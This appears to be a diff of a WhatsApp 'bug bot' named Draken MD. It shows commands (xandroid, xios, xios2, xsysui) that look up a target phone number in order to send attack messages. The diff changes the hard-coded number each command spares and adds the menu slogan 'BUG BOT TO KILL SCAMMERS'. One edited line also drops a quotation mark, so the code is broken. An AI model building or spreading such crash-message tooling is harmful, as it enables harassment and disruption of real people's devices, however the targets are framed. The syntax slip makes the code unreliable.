@@ -2084,7 +2084,7 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "33757054414") {
+  if (cleanedNumber == "33757054330") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2116,7 +2116,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "33757054414") {
+  if (cleanedNumber == "33757054330") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2212,7 +2212,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "33757054414") {
+  if (cleanedNumber == "33757054330") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2244,7 +2244,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "33757054414") {
+  if (cleanedNumber == "33757054330) {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2277,6 +2277,7 @@ break
                 let xeonmenuoh = `Hello ${pushname}
 ∆ ${xeonytimewisher} 💀👾
 DRAKEN MD MADE BY TOXXIC TECH
+BUG BOT TO KILL SCAMMERS 
 ${readmore}
 ∆ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ 👾
 > xandroid 👾
